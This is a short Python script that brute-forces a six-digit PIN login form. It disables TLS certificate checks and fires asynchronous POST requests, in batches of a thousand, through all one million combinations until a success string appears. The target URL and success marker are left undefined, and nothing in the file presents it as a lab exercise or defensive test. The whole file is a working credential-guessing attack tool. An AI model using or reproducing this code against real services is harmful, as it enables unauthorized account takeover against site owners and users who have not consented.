import aiohttp
import asyncio
import itertools
import ssl

sslcontext = ssl.create_default_context()
sslcontext.check_hostname = False
sslcontext.verify_mode = ssl.CERT_NONE

async def attempt_login(session, pincode):
    data = {
        'pincode.1': pincode[0],
        'pincode.2': pincode[1],
        'pincode.3': pincode[2],
        'pincode.4': pincode[3],
        'pincode.5': pincode[4],
        'pincode.6': pincode[5]
    }

    try:
        async with session.post(TARGET_URL, data=data, ssl=sslcontext) as response:
            text = await response.text()
            if SUCCESS_INDICATOR in text.lower():
                print(f"Success! The pincode is: {pincode}")
                return True
    except Exception as e:
        print(f"Request failed for pincode {pincode}: {e}")

    return False

async def main():
    digits = '0123456789'
    pincodes = (''.join(pincode) for pincode in itertools.product(digits, repeat=6))

    async with aiohttp.ClientSession() as session:
        tasks = []
        for pincode in pincodes:
            tasks.append(attempt_login(session, pincode))

            if len(tasks) >= 1000:  
                results = await asyncio.gather(*tasks)
                if any(results):
                    break
                tasks = []

        if tasks:
            await asyncio.gather(*tasks)

await main()
